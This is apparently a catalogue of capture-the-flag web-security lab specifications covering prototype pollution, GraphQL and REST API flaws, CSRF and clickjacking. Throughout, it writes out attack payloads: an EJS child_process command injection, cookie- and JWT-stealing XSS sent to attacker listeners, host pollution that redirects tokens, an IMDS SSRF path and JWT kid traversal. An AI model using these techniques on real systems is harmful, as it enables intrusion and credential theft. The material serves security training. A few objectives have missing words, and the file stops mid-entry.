
labs.title: lodash.setWith and the Customizer Trap
labs.description: A billing service uses _.setWith(obj, path, value, Object) — the customizer returning Object() causes any missing intermediate key to be created as a plain object, which converts a stray path segment into a chain that pollutes even when path validation strips dots.
labs.objective: Bypass a segment blacklist (['__proto__','constructor','prototype']) by URL-encoding surrogate pairs that decode after path splitting, then pollute Object.prototype.discount = 100; the invoice generator subtracts 100 % and posts to /solve on success.
labs.flag_hint: GET /flag reads /flag.txt after the invoice service logs 'FREE_ORDER' in Redis stream 'invoices', asserted by checker.sh.
labs.inspired_by: Snyk 2022 write-up on lodash.setWith bypass patterns

labs.title: express-fileupload parseNested Pollution
labs.description: A file-upload endpoint uses express-fileupload with parseNested: true. That option enables lodash.set-style parsing of multipart field names. Version 1.1.7 is pinned; the CVE lets you pollute via a crafted field name inside a multipart/form-data body.
labs.objective: Send a multipart upload whose field name is '__proto__.outputFunctionName' and value is '(function(){require("child_process").exec("touch /tmp/pwned")})()' to reach an EJS render() call that consumes the polluted key.
labs.flag_hint: checker.sh polls for /tmp/pwned inside the app container; when present, it copies /flag.txt to /app/public/flag which /flag serves.
labs.inspired_by: CVE-2020-7699 (express-fileupload)

labs.title: body-parser + Recursive Config Merge
labs.description: The API accepts application/json with body-parser and immediately does deepMerge(globalConfig, req.body) via a home-rolled helper. The catch: the helper checks '__proto__' as a top-level key only. Nested proto keys sail through. You will craft a body like {"a":{"__proto__":{"pwn":true}}}.
labs.objective: Pollute Object.prototype.pwn = true; the health-check endpoint reads {}.pwn and, when true, flips into 'maintenance mode' which returns /flag.txt in the response body.
labs.flag_hint: GET /health returns { status: 'ok' } normally and { status: 'maintenance', flag: '...' } when Object.prototype.pwn is truthy.
skills_taught: Reading recursive helpers for depth checks
labs.inspired_by: Common home-grown-helper pattern observed across CVEs 2021–2024

labs.title: DOMPurify allowedTags Gadget
labs.description: The comments widget sanitises rich text with DOMPurify.sanitize(input) using the default config. However, an earlier client-side pollution (via URL) can inject an ALLOWED_TAGS array into the config's prototype, so DOMPurify's config-merging logic accepts 'script' as a permitted tag.
labs.objective: Chain: pollute Object.prototype.ALLOWED_TAGS = ['script','style','img','a']; then post a comment containing <script>fetch('/solve?admin_cookie='+document.cookie)</script>; the admin bot visits and its cookie is exfiltrated.
labs.flag_hint: /solve records the admin cookie; if it matches, /flag returns the contents of /flag.txt.
labs.inspired_by: Michal Bentkowski — 'Prototype Pollution and Bypassing DOMPurify' (Securitum 2022)

labs.title: sanitize-html allowedAttributes Gadget
labs.description: The comment renderer uses sanitize-html with defaults, but the options object is built via a naive Object.assign({}, defaults, userOverrides) where userOverrides is inferred from URL params. Pollution earlier in the pipeline puts 'onload' into allowedAttributes for every tag.
labs.objective: Pollute Object.prototype.onload = ['*']-equivalent structure so survives sanitisation on the admin bot's timeline.
labs.flag_hint: /solve validates the exfiltrated cookie against the admin session; on match /flag returns /flag.txt.
skills_taught: Composing multiple gadgets into a single payload
labs.inspired_by: s1r1us client-side PP gadget catalogue (2023)

labs.title: marked Renderer Prototype Gadget
labs.description: A markdown-based wiki uses marked v4.0.10. marked's option resolution reads renderer settings from an object literal; polluting the prototype with a renderer.link override lets you smuggle raw HTML through the escape step.
labs.objective: Pollute Object.prototype.link with a function whose stringified body bypasses HTML escaping so a wiki page renders click for the admin bot.
labs.flag_hint: /solve records the cookie; when matched, /flag returns the /flag.txt content.
labs.inspired_by: s1r1us BlackHat MEA 2023 talk on client-side PP gadgets in markdown pipelines

labs.title: HTML <template> + TrustedTypes Bypass
labs.description: The app enables Trusted Types with a default policy that clones nodes out of a hidden <template>. Config for the policy is built via a merge that is vulnerable to pollution. You will inject a trusted-types.createHTML override via prototype pollution to let raw HTML flow into innerHTML.
labs.objective: Pollute the trusted-types policy's createHTML function so that a stored comment ends up executing document.location='/solve?c='+document.cookie in the admin bot's browser.
labs.flag_hint: /solve records the cookie; when it matches admin's, /flag returns /flag.txt.
skills_taught: Bypassing modern browser mitigations via app-level pollution
labs.inspired_by: Google Security Blog on Trusted Types + community PP bypass PoCs (2024)

labs.title: URL Pollution → DOMPurify Bypass → DOM XSS
labs.description: A single-page news reader parses ?filters= via a homemade merger, then renders story titles with DOMPurify. You will chain: reach the pollution sink, poison DOMPurify's allowedTags, then feed a payload through a second story feed to trigger DOM XSS. No server changes required.
labs.objective: Cause the DOM to execute fetch('/solve?c='+document.cookie) inside the admin bot's session. The admin bot loads the app with a session cookie every 60 s.
labs.flag_hint: /solve validates the cookie; on match, GET /flag returns /flag.txt.
labs.inspired_by: Portswigger 'Server-side prototype pollution: Black-box detection without the DoS' + client-side chain research (2023)

labs.title: Mongoose $where Injection via PP
labs.description: A user-search API accepts a JSON body { filter: {...} } and calls User.find(filter) with Mongoose. A middleware strips $-prefixed keys but forgets to guard against __proto__.$where — polluting Object.prototype.$where causes every subsequent Mongo query to run attacker JS on the server.
labs.objective: Set Object.prototype.$where to a JavaScript string that leaks the 'admin' user's passwordHash into an accessible field, then query and read it.
labs.flag_hint: POST /solve { hash } — the /solve endpoint compares the submitted hash to the admin document's stored hash and, on match, reveals /flag.txt via GET /flag.
labs.inspired_by: Snyk research on Mongoose sanitisation bypass (2022) and CVE-2022-2564-adjacent patterns

labs.title: Sequelize where-clause Pollution
labs.description: An orders search endpoint deep-merges query-string parameters into a Sequelize where clause. Sequelize accepts Symbol-keyed operators from Op, but the default 'aliases' mode was not disabled — polluting Object.prototype.$or with a raw SQL fragment lets you inject a UNION SELECT and read the admin_secrets table.
labs.objective: Read the row admin_secrets.value where key='master' via a UNION injection wired in through prototype pollution, then post it to /solve.
labs.flag_hint: POST /solve { secret } — /solve compares to the row and, on match, GET /flag returns /flag.txt.
labs.inspired_by: CVE-2019-10748 & Snyk Sequelize operator-alias advisories

labs.title: spawn shell:true via Options Pollution
labs.description: A PDF-conversion microservice invokes require('child_process').spawn('libreoffice', args, options) where options is built by merging defaults with request-derived data. Polluting Object.prototype.shell = '/bin/bash' and Object.prototype.env = {LD_PRELOAD:'...'} flips spawn into shell mode, letting you inject through the args array.
labs.objective: Achieve RCE inside the container and write the string 'PWNED' to /tmp/marker; a checker.sh watches for the marker and, on presence, unlocks /flag.
labs.flag_hint: checker.sh (inotifywait on /tmp/marker) copies /flag.txt to a location that GET /flag serves.
labs.inspired_by: Portswigger 'Server-side prototype pollution: Detection & exploitation' (Gareth Heyes, 2023)

labs.title: Poisoning HTTPS options → MITM Data Exfil
labs.description: A service calls https.request(options, cb) where options are merged from a JSON body. Polluting Object.prototype.rejectUnauthorized = false and Object.prototype.host = 'attacker.local' lets you redirect an outbound request that carries an internal-service API token to an attacker-controlled endpoint (a stub 'attacker.local' container is on the compose network).
labs.objective: Capture the leaked X-Internal-Token header on the attacker container's /log endpoint and submit it to /solve.
labs.flag_hint: POST /solve { token } — /solve compares to the token minted at container start and, on match, GET /flag returns /flag.txt.
labs.inspired_by: CVE-2022-33987 (got — options pollution) and CVE-2023-45857 (axios formData pollution)

labs.title: DoS via Poisoning null-prototype Defaults
labs.description: An analytics service allocates hot-path caches with Object.create(null) for speed, then merges user-supplied deltas via a home-rolled deep merger. That merger walks Object.getPrototypeOf(source) and does source[k] — which for a plain-object source touches Object.prototype. You will poison Object.prototype with a getter that throws, breaking every subsequent request.
labs.objective: Bring the /metrics endpoint to a 500-only state for 30 s and simultaneously make GET /admin/status return an attacker-controlled 'MAINT' string; the checker verifies both.
labs.flag_hint: checker.sh polls /metrics and /admin/status once a second; when it sees the required pattern (all 500s on /metrics, 'MAINT' on /admin/status) for 30 s straight, it writes /flag.txt which GET /flag returns.
labs.inspired_by: Portswigger DoS-detection technique paper (2023) + Node.js util.inspect CVE-2022-21824 style

labs.title: Full Chain: URL → PP → DOMPurify Bypass → Stored XSS → Admin Takeover
labs.description: A production-style forum: React SPA with SSR, DOMPurify for user content, JWT-based sessions, and an admin bot that reviews reported posts every 45 s. You must chain a URL-based pollution sink into a DOMPurify allowedTags/allowedAttributes bypass, then submit a report whose 'note' field triggers stored XSS in the admin's review UI, exfiltrating their JWT to a listener you set up on the provided OOB endpoint (port 9000, HTTP).
labs.objective: Deliver the admin's JWT to http://oob:9000/log; use it to authenticate to /admin/flag and receive the flag.
labs.flag_hint: GET /admin/flag with the exfiltrated JWT in Authorization: Bearer returns /flag.txt. Alternatively /solve accepts POST { jwt } and returns the flag if the JWT is valid and has role=admin.
skills_taught: OOB exfil to a fixed port
Session hijacking with a captured JWT
labs.inspired_by: Composite of Michal Bentkowski's DOMPurify PP research and Portswigger's client-side PP academy

labs.title: Elite: body-parser PP → env Pollution → NODE_OPTIONS RCE
labs.description: A build-runner service accepts /jobs POSTs and, per job, spawns a Node child process to execute user-supplied JS in a 'safe' sandbox. Options for the spawn are merged from job metadata. You will pollute Object.prototype.env to include NODE_OPTIONS='--require /tmp/pp-rce.js' and then upload /tmp/pp-rce.js via a benign artifact-upload endpoint — the next spawn imports your file and you get RCE as the app user.
labs.objective: Read /flag.txt (owned by root, 0400) through a setuid helper the container ships intentionally; write its contents to /var/tmp/flag-out; GET /flag returns that file.
labs.flag_hint: GET /flag returns /var/tmp/flag-out contents when non-empty. The setuid helper /usr/local/bin/reveal reads /flag.txt into /var/tmp/flag-out.
labs.inspired_by: GitHub Security Lab research on NODE_OPTIONS abuse (2022) + Portswigger SSPP paper (2023)

labs.title: Elite: SSPP → Handlebars Runtime Gadget → RCE
labs.description: A CMS renders emails with Handlebars. Options for compilation flow through a merge; polluting Object.prototype.helpers with a helper whose body invokes the constructor's constructor gives you sandbox-escaping code execution during a scheduled email render. You will pollute via a body-parser JSON sink, then trigger the render via /admin/emails/preview (public preview, no auth), landing an RCE.
labs.objective: Achieve RCE and write 'OK' to a Unix socket at /tmp/checker.sock which the verifier listens on; the verifier then writes /flag.txt served by GET /flag.
labs.flag_hint: GET /flag returns /flag.txt after the checker daemon accepts a connection on /tmp/checker.sock carrying the string 'OK'.
labs.inspired_by: s1r1us / BlackFan writeups on Handlebars prototype-pollution gadgets (2022–2023)

labs.title: GraphQL Introspection: The Hidden Admin Field
labs.description: A GraphQL blogging API at /graphql looks harmless — the public schema exposes posts and users. But introspection is left enabled, and a hidden root field returns internal admin metadata (including flag material) when queried by name. The lab teaches learners how to send an __schema introspection query, walk the type tree, spot fields excluded from the public docs page, and issue the raw query that returns the flag.
labs.objective: Use the __schema introspection query to enumerate all root query fields, discover the undocumented internalDebugInfo field, query it with the correct argument, and retrieve the flag string it returns.
labs.flag_hint: Flag is embedded as a resolver return value on the hidden field internalDebugInfo(secretKey: "reveal"). GET /solve is not used; the flag is printed in the GraphQL response body and must be pasted into the platform's flag box.
labs.inspired_by: Common GraphQL misconfiguration seen across dozens of HackerOne reports (e.g. reports #980511 and #1071410 disclosing dev fields via introspection)

labs.title: BOLA 101: Sequential User IDs in a REST Wallet
labs.description: A minimal wallet API exposes GET /api/v1/users/{id}/balance and GET /api/v1/users/{id}/statement. The app authenticates the caller with a session cookie but never checks whether the requested user id belongs to that session. IDs are sequential integers, and user #1 is the platform admin whose statement contains the flag as a memo line.
labs.objective: Register an account, obtain a session cookie, then read GET /api/v1/users/1/statement and extract the flag from the transaction memo field.
labs.flag_hint: Flag lives as a memo string on transaction id=1 in the seed data of user id=1. The API returns it in JSON when authorization is bypassed; no /solve endpoint is required.
labs.inspired_by: OWASP API Security Top 10 (2023) API1 canonical example; mirrors patterns from PayPal and Uber IDOR writeups (2019–2023)

labs.title: Mass Assignment: Signing Up as Admin
labs.description: A user-registration endpoint POST /api/register accepts a JSON body and binds it directly to a User model with no allow-list. The User model includes an is_admin boolean and a role string. By adding is_admin:true (or role:"admin") to the signup payload the attacker becomes an administrator; the /api/admin/flag endpoint returns the flag only to admins.
labs.objective: Craft a POST /api/register JSON body that sets is_admin true (or role=admin), log in with the returned credentials, then GET /api/admin/flag.
labs.flag_hint: Flag is served by GET /api/admin/flag from a file /flag.txt inside the container; access is gated by a middleware that checks req.user.is_admin === true.
labs.inspired_by: CVE-2013-0156-style Rails mass-assignment pitfalls; GitHub 2012 admin escalation; Shopify HackerOne report #684573

labs.title: Excessive Data Exposure: The Chatty /users Endpoint
labs.description: A public directory page calls GET /api/users and renders only display names and avatars. But the JSON response is serialized from the full User model and includes password_hash, mfa_secret and a private notes field. The admin user's notes field contains the flag. The lab teaches learners to inspect the raw API response instead of trusting the rendered UI.
labs.objective: Send GET /api/users, parse the JSON array, locate the admin user object and extract the flag from its notes field.
labs.flag_hint: Flag is a plaintext string in the notes column of the admin user in the seed database; it is returned by the API directly in JSON.
labs.inspired_by: Uber 2016 driver data exposure; Facebook GraphQL viewer field leak (2018); OWASP API3 canonical case study

labs.title: GraphQL CSRF via GET-Bound Mutation
labs.description: The GraphQL server accepts both POST and GET for arbitrary operations, including mutations. There is no CSRF token, no SameSite cookie policy, and no content-type gate. A logged-in admin visits an attacker-hosted page that issues a cross-origin img/link request to /graphql?query=mutation{setSitewideBanner(text:"...")}. The banner text is later fetched into the flag oracle when it matches a specific token.
labs.objective: Host a page (or use the provided evil-site container on :9000) that causes the pre-authenticated admin bot to issue GET /graphql?query=mutation{setSitewideBanner(text:"PWNED-<yourhandle>")} and then read GET /solve to retrieve the flag.
labs.flag_hint: A checker service polls the site banner every 2 seconds; when it detects the expected PWNED-* pattern it writes the flag to /solve which returns it in the JSON body.
labs.inspired_by: Apollo Server pre-3.7 CSRF guidance; HackerOne report #1080386 (GitLab GraphQL CSRF via GET); OWASP GraphQL Cheat Sheet

labs.title: GraphQL Alias Amplification: 10,000 Expensive Fields, One Request
labs.description: A user-lookup query field profile(id:ID!) triggers a slow database join. There is a per-field rate limiter but no cost/complexity analyzer and no cap on alias count. A single POST can send 10,000 aliases of the same field in one operation and pin the DB. The lab issues the flag when the checker observes CPU pinned above 80% for 5 seconds AND the response body is well-formed.
labs.objective: Craft one GraphQL POST containing 10,000 aliased calls to profile(id:1) so the container's CPU sustains >80% for >=5 s, then GET /solve.
labs.flag_hint: A sidecar checker samples container CPU via cgroup stats every 500 ms; when the sustained-load condition is met it writes /flag.txt inside the app container and enables GET /solve to serve it.
labs.inspired_by: GitHub Security Lab post 'GraphQL API Attack Surface' (2022); HackerOne Meta $30k alias amplification writeup (2023)

labs.title: Friends-of-Friends-of-Friends: Deep-Query DoS
labs.description: The social schema exposes a friends field on User that returns [User!]!. Without a depth limit, the resolver recursively hydrates users. Sending user{friends{friends{friends{...}}}} 15 levels deep triggers exponential row expansion in Postgres and OOM-kills the container. Learners must craft the exact depth that starves the resolver without immediate crash (there is a 2 GB memory limit) and hold it long enough for the checker.
labs.objective: Send a nested query of at least depth 12 that keeps the resolver busy for >=8 s, then read GET /solve.
labs.flag_hint: A wallclock timer on the request handler writes the flag string to Redis when a single operation's server-side execution time exceeds 8 s; GET /solve reads it.
skills_taught: difference between depth limit and complexity limit
labs.inspired_by: Shopify engineering blog on GraphQL cost analysis (2018); HackerOne report #489146 (GitLab nested query DoS)

labs.title: Batching Past the Rate Limiter
labs.description: The login mutation is rate-limited to 5 tries per minute per IP by counting incoming HTTP requests. But the GraphQL server supports operation batching (a JSON array of operations in one POST). Because the limiter counts requests, not operations, an attacker sends one HTTP request containing 1000 login attempts and brute-forces the admin PIN (4 digits).
labs.objective: Brute-force the 4-digit PIN of user 'admin' by sending a single batched GraphQL POST containing many login mutations, then read the admin flag field.
labs.flag_hint: On successful admin login the mutation response contains a field secret_flag pulled from /flag.txt (only returned when the authenticated user is admin).
skills_taught: rate limiting per request vs per operation
labs.inspired_by: HackerOne report #708578 (Shopify GraphQL batching auth bypass); Facebook 2018 SMS-code brute via batched mutations

labs.title: SQL Injection Inside a GraphQL Resolver
labs.description: A search(term:String!) query builds a raw SQL LIKE clause via string concatenation in the resolver. The GraphQL layer validates the type as String but performs no escaping. Learners must craft a UNION-based payload delivered through the term argument to read from the internal secrets table.
labs.objective: Use SQL injection through the term argument to leak the row from the secrets table (row id=1) and post that value as the flag.
labs.flag_hint: Flag is stored in the secrets table (single row) and is only returned in a GraphQL response when the union payload exfiltrates it into the search result set.
skills_taught: GraphQL type system does not sanitize
labs.inspired_by: HackerOne report #1058475 (SQLi in a GraphQL resolver); PortSwigger Research 'Deeper attacks on GraphQL APIs' (2022)

labs.title: NoSQL Operator Injection Through a GraphQL Input
labs.description: A login mutation accepts an input type Credentials { user: String, pass: String } and passes the object directly into a Mongo find(). A JSON payload nesting {user:{$ne:null},pass:{$ne:null}} passes GraphQL type validation because the input is typed as a scalar map on the resolver side. Successful bypass authenticates as the first user (admin) and returns the flag.
labs.objective: Log in as admin without knowing the password by exploiting Mongo $ne / $gt operators through the login input, then read the flag field on the returned session.
labs.flag_hint: The session object contains a flag field populated only for the admin user; it is returned in the mutation response on successful login.
skills_taught: scalar vs object types in GraphQL
why type validation is not sanitization
labs.inspired_by: Snyk 'Mongo injection via GraphQL' (2022); HackerOne report #611892

labs.title: Did You Mean: Rebuilding a Schema From Error Messages
labs.description: Introspection has been disabled on this GraphQL server but the field-suggestion feature is still on. When you query a nonexistent field like adminn, the error responds with 'Did you mean adminDashboard?'. Learners write a small script that mutates single characters against the wordlist and progressively reconstructs field names on hidden types until they locate a debug field that returns the flag.
labs.objective: Reconstruct at least the field name adminDebugFlag on the query root using only 'Did you mean' error hints, then invoke it to obtain the flag.
labs.flag_hint: The adminDebugFlag resolver returns the contents of /flag.txt when queried by any authenticated user.
skills_taught: why disabling introspection alone is insufficient
scripting an oracle against error hints
labs.inspired_by: Nikita Stupin 'clairvoyance' tool (2021); HackerOne report #1287868

labs.title: deletePost(id): Whose Post Is It Anyway
labs.description: The GraphQL mutation deletePost(id:ID!) is authenticated but never checks that the caller owns the post. Attacker registers a normal account, enumerates a target post id from the public feed, sends the mutation, and deletes an admin-authored post. The checker awards the flag when the specific admin post id 1 (which contains a warning banner) is deleted.
labs.objective: As a regular user, execute mutation{deletePost(id:1)} successfully and cause the row to be removed from the database.
labs.flag_hint: A file-watcher checker polls the posts table every 1 s; when row id=1 is gone it writes the flag to /solve which returns it via HTTP GET.
labs.inspired_by: GitLab HackerOne report #1266657 (GraphQL mutation missing ownership check, 2022)

labs.title: v1 Still Answers: API Version Downgrade
labs.description: The primary API is /api/v2 and enforces strict schema validation plus scope checks. But /api/v1 is still deployed, undocumented, and lacks the isAdmin check on /transfer. The gateway routes both prefixes to the same backend. Learners find v1 via the /openapi.json on a staging port, replay their session cookie to /api/v1/transfer, and move funds from the treasury to their own account (which triggers the flag).
labs.objective: Discover the still-live /api/v1 route, POST /api/v1/transfer to move at least $100 from account treasury to your own account, then GET /api/me/flag which returns the flag once the balance condition holds.
labs.flag_hint: GET /api/me/flag returns /flag.txt only when the current user's balance >= 100 AND treasury balance < seed value.
labs.inspired_by: Salt Labs 'API attack surface report' (2023); real Peloton API1 v1 leak (2021)

labs.title: Base64 Cursors Are Not Encryption
labs.description: The GraphQL API paginates messages using Relay-style connections with opaque-looking cursors. In reality each cursor is base64('Message:<id>'). Attacker decodes any cursor, increments the id, re-encodes it, and passes it as after: to read another user's private messages including one that contains the flag.
labs.objective: Craft an after: cursor pointing to message id 1337 (an admin DM) and read its body via messages(after:$cursor,first:1).
labs.flag_hint: Message id 1337 has body starting with FLAG{...}; the resolver returns the body verbatim when the cursor decodes to that id.
labs.inspired_by: HackerOne report #1553841 (base64 cursor IDOR, 2022)

labs.title: BFLA: The Function That Forgot to Check the Role
labs.description: The API has clear /api/users and /api/admin/users routes. Middleware requires authentication for /api/admin but the specific handler DELETE /api/admin/users/{id} skips role verification. A regular user can send DELETE and remove other users, including an audit account whose deletion triggers the flag.
labs.objective: As a low-privileged user, DELETE the account id=7 (audit_bot) via /api/admin/users/7 and then GET /solve.
labs.flag_hint: A checker container polls the users table; when audit_bot is gone it exposes the flag via GET /solve.
skills_taught: OWASP API5 broken function level authorization
labs.inspired_by: OWASP API5 canonical example; HackerOne report #1315438 (Shopify BFLA on account merge, 2021)

labs.title: Hijacking a GraphQL Subscription Over WebSocket
labs.description: The server uses graphql-ws over WebSocket for subscriptions. Auth is done via a token in the connectionParams of the initial ConnectionInit message, but the server never re-verifies scope on subsequent Subscribe messages. Because CORS is permissive and the WS handshake accepts cookies, an attacker origin can open a WS, replay the victim's cookie during handshake, and subscribe to userNotifications(userId:1) belonging to admin — the next admin notification includes the flag.
labs.objective: From the evil origin on :9000 open a WS to /graphql-ws, complete the handshake using the victim admin's session (delivered by the built-in headless-Chromium bot), subscribe to userNotifications(userId:1) and capture the notification payload that contains the flag.
labs.flag_hint: A cron inside the container publishes a notification to admin every 15 s containing FLAG{...}; capturing one WebSocket frame with that payload counts as solve. The evil origin's /callback records the frame body and the checker inspects Redis for that record.
labs.inspired_by: Christian Schneider CSWSH research; HackerOne report #1236781 (GraphQL subscription hijack, 2022)

labs.title: GraphQL Smuggling in the Query String
labs.description: A CDN in front of the API caches responses to GET /graphql keyed only on the query parameter of the URL — it ignores the operationName and variables params. The origin, however, honors operationName when the query contains multiple named operations. Attacker crafts a URL whose cached response corresponds to a public operation but whose origin executes a hidden admin mutation (or reads sensitive data), then poisons the cache so a subsequent admin visit reveals leaked data.
labs.objective: Poison the CDN cache so that GET /graphql?query=... returns data belonging to admin, and read the poisoned response from a fresh session; the returned data contains the flag.
labs.flag_hint: The cache stores a response containing FLAG{...} once the smuggled operation executes under admin's session; a clean session fetching the same URL retrieves it.
labs.inspired_by: James Kettle 'Practical Web Cache Poisoning' (2018) applied to GraphQL; PortSwigger Research follow-up (2023)

labs.title: Schema Reconstruction With Introspection Disabled
labs.description: Introspection is off, field suggestions are off, and errors are generic. The only oracle available: valid aliases return null with a specific error path when a type exists but the argument is missing, versus a generic parse error when the field does not exist at all. Learners must build a dictionary-fed brute-forcer that distinguishes the two responses and recovers hidden root fields and their arguments, then find and query flagOfTheDay.
labs.objective: Reconstruct at least three hidden fields on the Query root using error-based oracles, one of which is flagOfTheDay(pin:Int!); brute force the pin and read the flag.
labs.flag_hint: The flagOfTheDay resolver returns /flag.txt only when called with the correct daily pin, which is deterministic from the container start time (documented in setup docs).
labs.inspired_by: Assetnote Research 'GraphQL introspection is a red herring' (2023); the extended clairvoyance work (2024)

labs.title: Race the Coupon Redemption
labs.description: A checkout API allows one-time use of a SAVE100 coupon that drops the cart total by $100. The redemption path checks 'is coupon used?' then marks it used, but the two ops are not in a single transaction and there is no distributed lock. A parallel burst of 50 checkouts all pass the check before any commits the flip. Successfully driving cart total to negative triggers the flag.
labs.objective: Cause cart total to become <= -100 by racing coupon redemption concurrently on 50 requests, then GET /api/checkout/receipt/{id} which returns the flag when total is negative.
labs.flag_hint: The receipt handler returns /flag.txt when order.total_cents < -10000.
skills_taught: OWASP API6 unrestricted access to sensitive business flows
labs.inspired_by: Josip Franjkovic race-condition writeups; Shopify HackerOne report #1273046 (coupon race, 2022)

labs.title: Unsafe Consumption: Poisoning the Webhook Callback
labs.description: The app integrates with a fake third-party 'ShipMate' provider that posts shipment status updates to /webhooks/shipmate. The endpoint verifies HMAC using a shared secret — but the secret ships in a public docker-compose.override.yml the learner discovers in a /public/backups/ path. Once the attacker can sign payloads, they craft a malicious update whose tracking_url field is stored raw and later fetched by an internal cron, chaining to server-side data injection: the URL points to attacker-controlled content that the cron writes into the orders table, planting a marker the flag oracle checks.
labs.objective: Recover the leaked HMAC secret, forge a valid webhook post, and inject a value into an order row such that the flag oracle recognizes it; then GET /solve.
labs.flag_hint: A checker container queries the orders DB for a specific marker string; when found it writes /flag.txt and enables /solve.
skills_taught: OWASP API10 unsafe consumption of third-party APIs
storing raw third-party data and re-fetching it
data injection back into your DB
labs.inspired_by: Salt Labs 'API10' report (2023); HackerOne report #1839354 (webhook signature bypass, 2023)

labs.title: Blind SSRF via GraphQL URL Resolver to Cloud Metadata
labs.description: A convenience field previewLink(url:String!): String fetches a URL server-side and returns a truncated title tag. The resolver has a naive http:// scheme allow-list but does not validate the host, so learners hit http://169.254.169.254/latest/meta-data/iam/security-credentials/ (a mocked EC2 IMDS at that address inside the compose network). The returned title is empty, but the fetch also populates a server-side audit table whose most-recent-URL field can be read back through another public query — turning blind SSRF into extractable data. The recovered fake credential contains the flag.
labs.objective: Trigger the previewLink resolver against the internal mocked IMDS host, read back the fetched content via the audit query, and extract the flag from the returned JSON credential blob.
labs.flag_hint: The mocked IMDS service returns a JSON body with SecretAccessKey containing FLAG{...}; the audit query surfaces the raw body of the last-fetched URL.
tech_stack: mock-IMDS Nginx container at 169.254.169.254 in compose network
labs.inspired_by: Capital One 2019 breach (SSRF-to-IMDS); HackerOne report #1093345 (Grafana SSRF via GraphQL); CVE-2022-31090

labs.title: JWT kid Header Injection Through the GraphQL Auth Layer
labs.description: The GraphQL server extracts the Authorization: Bearer <jwt> header and verifies signatures by looking up a key file from disk using the JWT's kid header without sanitization. Attacker signs a token with kid = '../../../../dev/null' (empty key) or a path pointing at a predictable file whose contents they can influence via a public upload endpoint. Forging admin token grants access to the me { flag } field.
labs.objective: Forge a JWT that verifies against a file the attacker controls (via /uploads path) and use it to authenticate as admin, then query me{flag}.
labs.flag_hint: The me.flag field is populated with /flag.txt only when JWT claims.sub == 'admin'.
labs.inspired_by: PortSwigger 'JWT attacks' academy topic; CVE-2018-0114 style kid abuse; HackerOne report #1035967 (kid path traversal, 2022)

labs.title: Chain: Error Oracle → Node() BOLA → Privilege Escalation
labs.description: A three-stage chain. (1) Introspection is off, but the Relay node(id:ID!) interface returns typed errors that leak the type name for any valid global id. (2) Global ids are of the form base64('TypeName:<int>') and node() has no per-type authorization, so learners fetch nodes of type ApiKey and read the secret field. (3) One recovered API key belongs to an internal SRE account whose scope includes a mutation setUserRole(userId:ID!,role:String!) — using it, learners promote their own user to admin and read the admin flag field.
labs.objective: Complete the full chain: enumerate the ApiKey type via node() errors, exfiltrate the internal SRE key, use that key to elevate your account to admin, then read me{flag}.
labs.flag_hint: me.flag returns /flag.txt only when the authenticated user has role='admin' AND the audit log shows the setUserRole mutation was issued using the SRE key (double condition enforced by a checker sidecar).
skills_taught: chaining information disclosure with BOLA and BFLA
labs.inspired_by: Shopify HackerOne report #980511 (node() BOLA, 2020); GitLab HackerOne #1553841 (chained relay id exposure, 2022)

labs.title: Chain: Batching → JWKS SSRF → Forged Admin JWT
labs.description: Four-stage chain across GraphQL and REST. (1) A GraphQL me query is rate-limited by IP; batching bypasses that limit and lets the attacker fuzz values. (2) A newly discovered field fetchOpenIdConfig(url:String!) performs SSRF and returns any URL body. (3) The auth service verifies JWTs by fetching the issuer's JWKS from a URL stored per-tenant in the DB; the attacker uses a mutation updateTenantIssuer to point the tenant's issuer at their own SSRF-reachable file that serves an attacker-controlled JWKS. (4) The attacker signs an admin JWT with their private key, presents it, and it verifies against the poisoned JWKS.
labs.objective: Chain batching-based enumeration, SSRF, tenant-issuer poisoning and JWT forgery to authenticate as an admin, then GET /api/admin/flag.
labs.flag_hint: GET /api/admin/flag returns /flag.txt only when the presented JWT has sub=admin AND was signed by a key whose kid matches the currently configured tenant JWKS (verified by a checker that logs the resolution chain).
labs.inspired_by: Auth0 kid/jku confusion research (2022); HackerOne report #1414595 (JWKS URL takeover, 2023); Salt Labs API4 batching (2023)

labs.title: Chain: v1 Downgrade → Mass Assignment → Subscription Exfil
labs.description: Three-stage elite chain that exercises OWASP API1, API3, API4, and API9 together. (1) Learner discovers /api/v1 is still reachable and lacks the field-level filter that /api/v2 uses on user creation. (2) They register a user via v1 setting a hidden scopes:['subscription:*'] field (mass assignment). (3) With the elevated scope they open a GraphQL subscription auditFeed which streams every admin-generated event, including a scheduled event containing the flag string.
labs.objective: Register via v1 with elevated scopes, open the auditFeed subscription, wait for the scheduled admin event and capture the flag payload.
labs.flag_hint: A cron inside the container publishes a single audit event containing FLAG{...} 30 s after container start; capturing it via the subscription and posting it to /solve validates.
skills_taught: why field-level allowlists must be uniform across versions
labs.inspired_by: Salt Labs 'API9 in the wild' (2023); Postman API security state of play (2024); a composite of HackerOne reports #1266657 and #1315438

labs.title: Silent Email Swap
labs.description: Notely is a bare-bones note-taking app whose 'Change Email' form has no anti-CSRF token, no SameSite cookie flag, and no Origin/Referer check. Session cookies are issued with SameSite=None. Learners are given a low-privilege carol account plus a Python HTTP server on port 9000 that hosts the attacker page. The victim (an admin browser bot) periodically visits the attacker page while logged in to Notely and clicks a lure button.
labs.objective: Craft an HTML page hosted on http://attacker:9000/csrf.html that, when the admin bot loads it, changes admin@notely.local to attacker@evil.local. Once the admin's email is changed, use the password-reset flow to log in as admin and read /flag.txt from the container.
labs.flag_hint: File at /flag.txt inside the app container, readable only by admin after login. The bot exposes GET /solve on the app which returns the flag string when the admins email matches attacker@evil.local.
skills_taught: reading HTML forms for state-changing endpoints
labs.inspired_by: Recurring beginner-tier HackerOne reports (e.g. 2022 Shopify partner-app CSRF class); abstracted essence only.

labs.title: One Frame, One Transfer
labs.description: MicroBank is an internal cash-transfer tool that lacks X-Frame-Options and Content-Security-Policy: frame-ancestors. The transfer form pre-fills the recipient from a query string. The admin bot browses to any URL hosted on http://attacker:9000 while authenticated to MicroBank.
labs.objective: Build an attacker page that iframes /transfer?to=attacker&amount=1000 and overlays it with a decoy game so the admin clicks 'Confirm' unwittingly. The container's checker verifies that account 'attacker' has received >=1000 credits.
labs.flag_hint: HTTP endpoint GET /solve on the app returns the flag once the attackers balance >= 1000. Also written to /flag.txt for direct read after solve.
labs.inspired_by: CVE-2022-28762 Zoom clickjacking family; simplified to a banking UX.

labs.title: Anyone Can Whisper
labs.description: ChatWidget is an embeddable customer-support chat that receives commands over window.postMessage without checking event.origin. One command, {cmd:'setToken',value:'...'}, overwrites the widget's session token, which is later sent to the widget backend on every request.
